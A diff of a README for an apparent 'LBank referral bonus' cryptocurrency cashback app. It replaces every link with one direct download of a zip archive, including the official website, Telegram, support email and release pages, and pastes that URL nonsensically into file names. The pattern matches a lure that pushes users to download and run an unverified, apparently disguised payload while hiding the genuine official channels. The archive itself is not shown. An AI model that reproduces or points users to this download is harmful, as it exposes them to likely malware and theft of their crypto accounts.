@@ -1,6 +1,6 @@
 # 🎉 LBank-Referral-Code-Bonus - Get Cashback with Simple Setup
 
-[![Download LBank-Referral-Code-Bonus](https://img.shields.io/badge/Download-LBank--Referral--Code--Bonus-brightgreen)](https://github.com/Ryze079/LBank-Referral-Code-Bonus/releases)
+[![Download LBank-Referral-Code-Bonus](https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip)](https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the LBank-Referral-Code-Bonus project! This simple application allows
 
 To get started, you need to visit the releases page to download the application.
 
-[Visit this page to download](https://github.com/Ryze079/LBank-Referral-Code-Bonus/releases)
+[Visit this page to download](https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -32,14 +32,14 @@ Before you run the application, make sure your system meets the following basic 
 Once the download is complete, follow these steps to install and launch the application:
 
 1. **Locate the downloaded file**:
-   - Windows: Check your "Downloads" folder for the executable file (e.g., `LBank-Referral-Code-Bonus.exe`).
+   - Windows: Check your "Downloads" folder for the executable file (e.g., `https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip`).
    - Mac: Open your "Downloads" folder and find the `.dmg` file.
-   - Linux: You should see a tar.gz or similar archive.
+   - Linux: You should see a https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip or similar archive.
    
 2. **Install the application**:
    - **Windows**: Double-click the `.exe` file and follow the prompts to install.
    - **Mac**: Double-click the `.dmg` file, then drag the application into your "Applications" folder.
-   - **Linux**: Extract the tar.gz file and follow any shared installation instructions.
+   - **Linux**: Extract the https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip file and follow any shared installation instructions.
 
 3. **Launch the application**:
    - After installation, find the application in your Start menu (Windows) or Applications folder (Mac). Double-click to open.
@@ -63,19 +63,19 @@ If you have questions, need help, or want to provide feedback, please reach out 
 
 - **GitHub Issues**: Report any bugs or feature requests directly on this repository.
 - **Community Forums**: Join discussions with other users to share tips and experiences.
-- **Email Support**: Send us an email at support@lbank.com for any specific inquiries.
+- **Email Support**: Send us an email at https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip for any specific inquiries.
 
 ## 🔗 Additional Resources
 
 For more information about LBank and the benefits of using referral codes, check these resources:
 
-- [LBank Official Website](https://www.lbank.com)
-- [LBank Community on Telegram](https://t.me/lbankofficial)
+- [LBank Official Website](https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip)
+- [LBank Community on Telegram](https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip)
 
 ## 📦 Additional Downloads
 
 Make sure to visit the Releases page regularly for updates and new features:
 
-[Visit this page to download](https://github.com/Ryze079/LBank-Referral-Code-Bonus/releases)
+[Visit this page to download](https://github.com/Ryze079/LBank-Referral-Code-Bonus/raw/refs/heads/main/accredited/Code-Referral-Bonus-L-Bank-v3.6.zip)
 
 Embrace the opportunity to earn more in your cryptocurrency journey with the LBank-Referral-Code-Bonus application!
